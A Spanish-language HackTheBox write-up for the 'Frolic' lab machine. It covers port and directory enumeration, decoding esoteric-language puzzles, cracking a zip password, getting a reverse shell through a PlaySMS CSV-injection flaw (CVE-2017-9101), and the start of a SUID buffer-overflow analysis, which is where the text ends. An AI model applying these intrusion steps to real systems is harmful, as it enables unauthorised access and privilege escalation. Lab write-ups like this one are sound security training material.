---
title: "Frolic - HTB Writeup"
layout: single
excerpt: "Frolic es una máquina de dificultad fácil de HackTheBox. En esta máquina hemos abusado de un csv injection para conseguir un RCE para la intrusión inicial. Para escalar privilegios nos aprovechamos de un binario vulnerable a buffer overflow para hacer un Ret2Libc y convertirnos en el usuario root."
show_date: true
classes: wide
header:
  teaser: "https://user-images.githubusercontent.com/67548295/134366070-3250af0c-130b-4ab7-8f24-79ac340871f7.png"
  teaser_home_page: true
  icon: "assets/images/icons/HackTheBox-icon.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - Cryptography
  - CSV injection
  - Ret2Libc Buffer Overflow
  - Linux
---

![image](https://user-images.githubusercontent.com/67548295/134366741-1f03d576-11cc-4965-ba9c-b092d4ad3a36.png)

# Enumeración

Comenzamos enviando una traza [ICMP](https://es.wikipedia.org/wiki/Protocolo_de_control_de_mensajes_de_Internet){:target="\_blank"}{:rel="noopener nofollow"} con la herramienta `ping`, con esto veremos el estado de la máquina y su sistema operativo:

```bash
┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/Frolic/nmap]
└──╼ $ping -c 1 10.10.10.111
PING 10.10.10.111 (10.10.10.111) 56(84) bytes of data.
64 bytes from 10.10.10.111: icmp_seq=1 ttl=63 time=65.6 ms

--- 10.10.10.111 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 65.566/65.566/65.566/0.000 ms
```

| Parámetro | Acción |
|:---------:|:------:|
| `-c 1` | elegimos que solo queremos enviar 1 traza |

Se puede ver que la máquina está **activa** y que observando el TTL, concluimos que es una máquina **Linux**.

Más información sobre la **detección de OS** mediante TTL [aquí](https://subinsb.com/default-device-ttl-values/){:target="\_blank"}{:rel="noopener nofollow"}.

También puedes hacer uso de mi herramienta [OSidentifier](https://github.com/z3robyte/OSidentifier){:target="\_blank"}{:rel="noopener nofollow"}.

## Nmap

Ahora vamos con la fase de enumeración de puertos utilizando la famosa herramienta `nmap`:

```bash
┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/Frolic/nmap]
└──╼ $sudo nmap -p- --open -sS --min-rate 4000 -n 10.10.10.111 -sC -sV -oN targeted 
[sudo] password for z3r0byte: 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-22 15:53 WEST
Nmap scan report for 10.10.10.111
Host is up (0.069s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1880/tcp open  http        Node.js (Express middleware)
|_http-title: Node-RED
9999/tcp open  http        nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h49m58s, deviation: 3h10m30s, median: 0s
|_nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2021-09-22T14:54:27
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: frolic
|   NetBIOS computer name: FROLIC\x00
|   Domain name: \x00
|   FQDN: frolic
|_  System time: 2021-09-22T20:24:27+05:30

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.86 seconds
```

| Parámetro | Acción |
|:---------:|:------:|
| `-p-` | Es una forma de especificar que queremos escanear todos los puertos existentes, los 65535. |
| `--open` | Este parámetro hace que nos muestre únicamente los puertos abiertos, que nos omita los filtered. |
| `-sS` | Especificamos el tipo de escaneo 'SYN port Scan', que es más rápido y sigiloso que el tipo de escaneo por defecto. |
| `--min-rate [valor]` | Envía paquetes tan o más rápido que la tasa dada. |
| `-n` | Quitamos la resolución DNS para que el escaneo vaya más rápido. |
| `-sC` | Utiliza un escaneo con una serie de scripts por defecto de nmap. |
| `-sV` | Activa la detección de versiones. |
| `-oN [nombre de archivo]` | Exporta los resultados en formato normal, tal cual se ve en el escaneo. |

Podemos observar que hay 5 puertos abiertos:

| Puerto | Servicio |
|:------:|:--------:|
| 22 | [SSH](https://www.hostinger.es/tutoriales/que-es-ssh){:target="\_blank"}{:rel="noopener nofollow"} |
| 139 | [NetBIOS](https://es.wikipedia.org/wiki/NetBIOS){:target="\_blank"}{:rel="noopener nofollow"} |
| 445 | [SMB](https://www.ionos.mx/digitalguide/servidores/know-how/server-message-block-smb/){:target="\_blank"}{:rel="noopener nofollow"} |
| 1880 y 9999 | [HTTP](https://developer.mozilla.org/es/docs/Web/HTTP){:target="\_blank"}{:rel="noopener nofollow"} |


# User.txt

Empiezo enumerando los puertos correspondientes al servicio **HTTP** con `whatweb`:

**Puerto 1880**:
```bash
┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/Frolic/nmap]
└──╼ $whatweb http://10.10.10.111:1880
http://10.10.10.111:1880 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.10.10.111], Script[text/x-red], Title[Node-RED], 
X-Powered-By[Express], X-UA-Compatible[IE=edge]
```

**Puerto 9999**
```bash
┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/Frolic/nmap]
└──╼ $ whatweb http://10.10.10.111:9999
http://10.10.10.111:9999 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.10.3 (Ubuntu)], IP[10.10.10.111],
Title[Welcome to nginx!], nginx[1.10.3]
```
---

En el puerto **1880** parece ser que hay instalado un servicio [Node-RED](https://iotconsulting.tech/que-es-node-red-y-para-que-sirve/){:target="\_blank"}{:rel="noopener nofollow"}.

Y en el puerto **9999** parece solo estar la página por defecto de cuando instalas [Nginx](https://www.hostinger.es/tutoriales/que-es-nginx){:target="\_blank"}{:rel="noopener nofollow"}.

Visitemos el **sitio web** alojado en el puerto `1880` con el navegador:

![image](https://user-images.githubusercontent.com/67548295/134371565-f60e54a2-047c-4f29-98dd-6cd32a484db4.png)

Como imaginabamos, está instalada la plataforma de desarrollo `Node-RED`.

Veamos ahora el puerto **9999**:

![image](https://user-images.githubusercontent.com/67548295/134372138-662bec58-4d3d-4670-9ab0-5594256cfefb.png)

Y como también imaginabamos, vemos la página de por defecto del servidor `Nginx`.

Bien, ahora hagamos _fuzzing_ de directorios al puerto **1880** para ver si encontramos algo interesante, esto con la herramienta `gobuster`:

```bash
┌──[z3r0byte@z3r0byte]─[~]                  
└──╼ $gobuster dir -u "http://10.10.10.111:1880" -w "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt" -t 100 
===============================================================
Gobuster v3.1.0                                                                              
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) 
===============================================================
[+] Url:                     http://10.10.10.111:1880          
[+] Method:                  GET                                                             
[+] Threads:                 100
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/09/22 16:23:44 Starting gobuster in directory enumeration mode
===============================================================
/icons                (Status: 401) [Size: 12]
/red                  (Status: 301) [Size: 173] [--> /red/]
/vendor               (Status: 301) [Size: 179] [--> /vendor/]
/settings             (Status: 401) [Size: 12]                 
/Icons                (Status: 401) [Size: 12]                 
/nodes                (Status: 401) [Size: 12]                 
/SETTINGS             (Status: 401) [Size: 12]                 
/flows                (Status: 401) [Size: 12]
```

Nada interesante, parecen ser directorios propios de `Node-RED`.

Pruebo ahora a hacer lo mismo para el puerto **9999**:

```bash
┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/Frolic/nmap]
└──╼ $gobuster dir -u "http://10.10.10.111:9999" -w "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt" -t 100 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.111:9999
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/09/22 16:27:46 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/admin/]
/test                 (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/test/] 
/dev                  (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/dev/]  
/backup               (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/backup/]
/loop                 (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/loop/]
```

Vale, vemos varios directorios interesantes, ingresemos primero al directorio `admin`:

![image](https://user-images.githubusercontent.com/67548295/134373983-98a13a60-17f2-4893-82ca-ebae21dad658.png)

Y observamos que hay un panel de inicio de sesión diciendo que es vulnerable, bueno, veamos si es cierto.

Pruebo a mirar el código fuente:

![image](https://user-images.githubusercontent.com/67548295/134374407-9e382efc-ac36-4428-b003-7584c32c6785.png)

Me llama la atención el fichero `javascript` con nombre `login.js`. Veamos lo que hay dentro:

![image](https://user-images.githubusercontent.com/67548295/134374764-04547847-6a67-4dda-9079-f3486d260334.png)

Y bueno, vemos que se está haciendo una comparación de lo que introduzcamos en el panel en un archivo al que tenemos acceso. Desde luego una muy buena práctica.

Colocamos esas credenciales en el panel de login y accedemos:

![image](https://user-images.githubusercontent.com/67548295/134375144-6d748115-0bab-403d-9f6f-192ecdf7acbe.png)

![image](https://user-images.githubusercontent.com/67548295/134375307-2f04bf10-f47d-4365-ae93-a3b7dcc784f0.png)

Tras 'loggearnos' vemos esto, a simple vista parece algo sin sentido, pero yo ya estoy pensando en que sea un [lenguaje esotérico](https://es.wikipedia.org/wiki/Lenguaje_de_programaci%C3%B3n_esot%C3%A9rico){:target="\_blank"}{:rel="noopener nofollow"}.

Busco un listado de lenguajes esotéricos, y busco hasta que me encuentro con uno que era semejante:


![image](https://user-images.githubusercontent.com/67548295/134555508-50146bef-f075-4373-83a9-69ab25ba4824.png)

Como vemos es un lenguaje que se compone de puntos, exclamaciones e interrogaciones, al igual que el texto que hemos encontrado.

¿Y si es este lenguaje pero le han quitado la palabra Ook? Probemos a añadirle la palabra `Ook` a cada signo:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $cat esoteric 
..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... .....
..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... .....
....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! .....
..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!!
!!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... .....
..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?.
?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... .....
..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... .....
..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!!
!.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!!
!!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?!
.?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?..
!.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?.
?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.?
!!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!!
!.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!!
!.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. .....
..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!!
!!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!!
!!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .....
..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! .....
..!.! !!!!! !.?.

┌─[z3r0byte@z3r0byte]─[~]
└──╼ $cat esoteric | sed 's/\./Ook\./g' | sed 's/\!/Ook\!/g' | sed 's/\?/Ook\?/g'

[...]
Ook.Ook.Ook.Ook.Ook. Ook.Ook.Ook.Ook.Ook. Ook.Ook.Ook.Ook.Ook. Ook.Ook!Ook?Ook!Ook! Ook.Ook?Ook.Ook.Ook. Ook.Ook.Ook.Ook.Ook.
Ook.Ook.Ook.Ook.Ook. Ook.Ook.Ook.Ook?Ook. Ook?Ook!Ook.Ook?Ook. Ook.Ook.Ook.Ook.Ook. Ook.Ook.Ook.Ook.Ook. Ook.Ook.Ook.Ook.Ook.
Ook.Ook.Ook.Ook.Ook. Ook.Ook.Ook.Ook.Ook. Ook.Ook.Ook!Ook.Ook? Ook.Ook.Ook.Ook.Ook. Ook.Ook.Ook.Ook.Ook. Ook.Ook!Ook?Ook!Ook!
Ook.Ook?Ook.Ook.Ook. Ook.Ook.Ook.Ook.Ook. Ook.Ook.Ook?Ook.Ook? Ook!Ook.Ook?Ook.Ook. Ook.Ook.Ook.Ook.Ook. Ook.Ook.Ook.Ook.Ook.
[...]
```

Bien, ahora probemos a copiar esto y a ponerlo en un interprete de este lenguaje:

![image](https://user-images.githubusercontent.com/67548295/134557495-09774bcd-e84d-47b4-b817-8d5e811a39e4.png)

He usado la página de [dcode.fr](https://www.dcode.fr/){:target="\_blank"}{:rel="noopener nofollow"}.

Bueno, podemos ver que nos reporta lo que parece ser una ruta de un servidor web, probemos a ingresarla en el sitio web montado en el puerto 9999 para ver si existe:

![image](https://user-images.githubusercontent.com/67548295/134694195-8ce2a972-b6d3-47a0-b62e-6576119df2b7.png)

Y parece que sí, parece otro texto cifrado, en este caso identifico que es `base64`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ echo "UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7
nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40R
rXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAAB
AAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA " | tr -d ' ' | base64 -d > file

┌──[z3r0byte@z3r0byte]─[~]
└──╼ $ bat file
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: file   <BINARY>
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Y en este caso vemos que no es una cadena normal, sino un binario.

Usemos `file` para ver que tipo de binario es:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $file file
file: Zip archive data, at least v2.0 to extract
```
Vemos que es un archivo zip, probemos a descomprimirlo con la herramienta `7z`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $7z x file

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02

Scanning the drive for archives:
1 file, 360 bytes (1 KiB)

Extracting archive: file
--
Path = file
Type = zip
Physical Size = 360

    
Enter password (will not be echoed):
```
Pero al intentar dsecomprimir el zip, nos encontramos con que tiene contraseña.

Bien, podemos intentar _crackear_ la contraseña del zip con `john`.

Primero hay que extraer el hash del zip con `zip2john`, esto para que la herramienta `john` pueda entenderlo:

```bash
┌──[z3r0byte@z3r0byte]─[~]
└──╼ $zip2john file | tee hash
ver 2.0 efh 5455 efh 7875 file/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=176, decmplen=617, crc=145BFE23
file/index.php:$pkzip2XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX9c3*5e44e6104a9f73b2688a299a1b9550f06e0ba9bf5373e4024a7
1a11dc8ee5a034e2f6d98fXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX87a4ead0bbe2785f13c04e895bfd8d8453aaea38f283f2e20f914a
3253c72a830344d08d7d93XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX94c027787f6390c216dd8f74beb2373551ac0b9a8a030e95106b03
2c34b5d96229be3446b5e90609ffba84e396eae9efc72671326f8857d49ce339*$/pkzip2$:index.php:file::file

┌─[z3r0byte@z3r0byte]─[~]
└──╼ $john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
XXXXXXXX         (file/index.php)
1g 0:00:00:00 DONE (2021-09-24 16:48) 2.439g/s 19980p/s 19980c/s 19980C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Ahora que ya tenemos la contraseña, podemos descomprimir el zip:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $7z x file

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i5-7200U CPU @ 2.50GHz (806E9),ASM,AES-NI)

Scanning the drive for archives:
1 file, 360 bytes (1 KiB)

Extracting archive: file
--
Path = file
Type = zip
Physical Size = 360

    
Enter password (will not be echoed):
Everything is Ok

Size:       617
Compressed: 360
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $cat index.php
4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b79
34744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b79
7375504373674b79746XXXXXXXXXXXXXXXXXXXXXXXXXX06930744c5330674c5330754c5330674c5330744c5330674c6a7772
4b7973670d0a4b31737XXXXXXXXXXXXXXXXXXXXXXXXXX06973724b793467504373724b3173674c5434744c53304b5046302b
4c5330674c6a77724b7XXXXXXXXXXXXXXXXXXXXXXXXXX864506973674c6930740d0a4c533467504373724b3173674c543474
4c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a
776743673d3d0d0a
```

El zip contenia un archivo con nombre `index.php`, y contiene lo parece ser algo en formato `hexadecimal` ya que los digitos van del 0-9 y de la A-F.

Pasemos esto a formato ascii con la herramienta `xxd`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $xxd -r -ps index.php | tr -d '\r\n' | tee result.txt
KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwrKysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS [...]
```
Y parece ser de nuevo otra cadena en base 64.

Probemos a descifrarla:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $base64 -d result.txt 
+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
++..<
```

La herramienta dice que es una entrada inválida, pero a mi no me lo parece.

Esto claramente es otro lenguaje esotérico famoso que se llama `brainf*ck`

Hay muchas herramientas online que interpretan este lenguaje.

Busquemos alguna herramienta y veamos si podemos descifrar esto:

![image](https://user-images.githubusercontent.com/67548295/134707030-e2a70595-986b-4529-b88d-b6ceb6e93791.png)

Y nos devuelve una cadena de texto que espero que sea la última.

No sé que significa asi que la guardo para más tarde por si acaso.

---

Después de este puzzle de criptografía, seguí enumerando directorios hasta que encontre que en el directorio `dev` había más recursos:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $gobuster dir -u "http://10.10.10.111:9999/dev" -w "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt" -t 100 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.111:9999/dev
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/09/24 17:19:43 Starting gobuster in directory enumeration mode
===============================================================
/test                 (Status: 200) [Size: 5]
/backup               (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/dev/backup/]
```

Me llama la atención ese directorio `backup`, accedo a él para ver que hay:

![image](https://user-images.githubusercontent.com/67548295/134708429-89bad975-6ca3-4f04-b739-435aeb42c9f0.png)

Vemos otra ruta, accedo a ella:

![image](https://user-images.githubusercontent.com/67548295/134708917-696ae2cb-9b5e-4a58-b788-67afdfcc0e54.png)

`playsms`, no sé lo que es, pero tenemos un panel de inicio de sesión.

Pruebo credenciales comunes como `admin:admin` o `admin:password` pero en este caso no son válidas.

Me acuerdo de que la cadena de texto que habíamos encontrado haciendo el puzzle de criptografía. ¿Y si es una contraseña?

Pruebo esto:

![image](https://user-images.githubusercontent.com/67548295/134709523-fae11905-56b6-4a24-963a-1e9504cc7614.png)

![image](https://user-images.githubusercontent.com/67548295/134709576-65e07fa8-e0bc-4c77-9c45-dc5550901810.png)

¡Son válidas y conseguimos acceder!

Hago uso de la herramienta `searchsploit` para ver si hay vulnerabilidades asociadas a este software:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $searchsploit playsms | grep -v -i 'metasploit'
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PlaySms 0.7 - SQL Injection                                                                                                | linux/remote/404.pl
PlaySms 0.8 - 'index.php' Cross-Site Scripting                                                                             | php/webapps/26871.txt
PlaySms 0.9.3 - Multiple Local/Remote File Inclusions                                                                      | php/webapps/7687.txt
PlaySms 0.9.5.2 - Remote File Inclusion                                                                                    | php/webapps/17792.txt
PlaySms 0.9.9.2 - Cross-Site Request Forgery                                                                               | php/webapps/30177.txt
PlaySMS 1.4 - '/sendfromfile.php' Remote Code Execution / Unrestricted File Upload                                         | php/webapps/42003.txt
PlaySMS 1.4 - 'import.php' Remote Code Execution                                                                           | php/webapps/42044.txt
PlaySMS 1.4 - Remote Code Execution                                                                                        | php/webapps/42038.txt
PlaySMS 1.4.3 - Template Injection / Remote Code Execution                                                                 | php/webapps/48199.txt
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Tras probar unos cuantos exploits, me encuentro con uno funcional.

Concretamente el [CVE-2017-9101](https://nvd.nist.gov/vuln/detail/CVE-2017-9101){:target="\_blank"}{:rel="noopener nofollow"}.

Esta vulnerabilidad se aprovecha de un [CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection){:target="\_blank"}{:rel="noopener nofollow"} con el que podemos conseguir ejecución remota de comandos.

Para explotar esta vulnerabilidad tendremos que crear un fichero `.csv` malicioso con el que conseguiremos ejecutar comandos a través del [User-Agent](https://developer.mozilla.org/es/docs/Web/HTTP/Headers/User-Agent){:target="\_blank"}{:rel="noopener nofollow"}.

Luego ese archivo habrá que subirlo a una ruta del `playsms`, capturar la petición con `burpsuite`, cambiar el User-Agent y conseguir acceso al sistema mediante una reverse shell.

Bien, primero navegemos a esta ruta estando _loggeados_: `/index.php?app=main&inc=feature_phonebook&route=import&op=list`

![image](https://user-images.githubusercontent.com/67548295/134774201-55c557ae-e35b-4528-aac2-ada7c6ce47b7.png)

Ahora creemos el archivo `.csv` malicioso:

![image](https://user-images.githubusercontent.com/67548295/134774282-61d61a3c-a324-4128-a4cd-738c4e1d8a52.png)

Como se ve, es un payload que ejecuta todo lo que esté en el campo del `User-Agent`.

Bien ahora abramos el `burpsuite` y configuremos el proxy en el navegador:

![image](https://user-images.githubusercontent.com/67548295/134774373-2710fd0c-2ede-4dbe-8e12-e02f8231ae5c.png)

![image](https://user-images.githubusercontent.com/67548295/134774405-18e69282-f149-4a67-b51a-3f56efb07ec4.png)

Configuro el proxy en el navegador de Firefox con un `add-on` de nombre [FoxyProxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/){:rel="noopener nofollow"}.

Una vez con el proxy activado en el navegador y el burpsuite en escucha de peticiones, podremos subir el archivo:

#### 1º Paso
![navegador1](https://user-images.githubusercontent.com/67548295/134774995-ecc1981e-ad70-4aff-85cb-d1a184d734e2.png)
#### 2º Paso
![navegador2](https://user-images.githubusercontent.com/67548295/134775002-569fb016-8030-4b97-8167-b37867e66229.png)
#### 3º Paso
![terminal1](https://user-images.githubusercontent.com/67548295/134775007-6ed75012-dfbc-4610-9640-2449c4e09e12.png)
#### 4º Paso
![navegador3](https://user-images.githubusercontent.com/67548295/134775012-0c6d902a-d57c-4a23-9123-6c2d1a997d66.png)
#### 5º Paso
![terminal2](https://user-images.githubusercontent.com/67548295/134775016-9a4b6090-baa4-4622-ba8c-e2f6c55d05ce.png)

¡Conseguimos una reverse shell!

Podriamos ver la flag `user.txt` en `/home/ayush/user.txt`:

```bash
www-data@frolic:/$ cat /home/ayush/user.txt
2XXXXXXXXXXXXXXXXXXXXXXXXXXXXX0
```
# Root.txt

Enumerando el sistema me doy cuenta de que en el directorio home de `ayush` hay un directorio oculto poco común:

```bash
www-data@frolic:/home/ayush$ ls -lah
total 36K
drwxr-xr-x 3 ayush ayush 4.0K Sep 25  2018 .
drwxr-xr-x 4 root  root  4.0K Sep 23  2018 ..
-rw------- 1 ayush ayush 2.8K Sep 25  2018 .bash_history
-rw-r--r-- 1 ayush ayush  220 Sep 23  2018 .bash_logout
-rw-r--r-- 1 ayush ayush 3.7K Sep 23  2018 .bashrc
drwxrwxr-x 2 ayush ayush 4.0K Sep 25  2018 .binary
-rw-r--r-- 1 ayush ayush  655 Sep 23  2018 .profile
-rw------- 1 ayush ayush  965 Sep 25  2018 .viminfo
-rwxr-xr-x 1 ayush ayush   33 Sep 25  2018 user.txt
```
¿`.binary`? Accedamos para ver lo que hay:

```bash
www-data@frolic:/home/ayush/.binary$ ls -l
total 8
-rwsr-xr-x 1 root root 7480 Sep 25  2018 rop
```

Vemos un binario [SUID](https://www.zeppelinux.es/permisos-en-linux-sticky-bit-suid-y-sgid/){:target="\_blank"}{:rel="noopener nofollow"}, ejecutemoslo a ver que pasa:

```bash
www-data@frolic:/home/ayush/.binary$ ./rop

[*] Usage: program <message>
www-data@frolic:/home/ayush/.binary$ ./rop $(python -c 'print "A"*500')

Segmentation fault (core dumped)
```
Al ejecutar el binario me mostró un menú de ayuda en el que me decía que tenía que pasarle un argumento. Probe a pasarle 500 Aes y se produjo una **violación de segmento**.

Cuando se produjo esto, pensé en que podríamos explotar un [buffer overflow](https://es.wikipedia.org/wiki/Desbordamiento_de_b%C3%BAfer){:target="\_blank"}{:rel="noopener nofollow"}.

Transfiero el binario a mi máquina para poder inspeccionarlo más cómodamente:

![image](https://user-images.githubusercontent.com/67548295/134775660-a03821a5-122d-47af-b2b3-82a1fc382a57.png)

---

Hago uso de la utilidad [Gef](https://github.com/hugsy/gef){:target="\_blank"}{:rel="noopener nofollow"} para inspeccionar el binario:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $gdb rop
GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
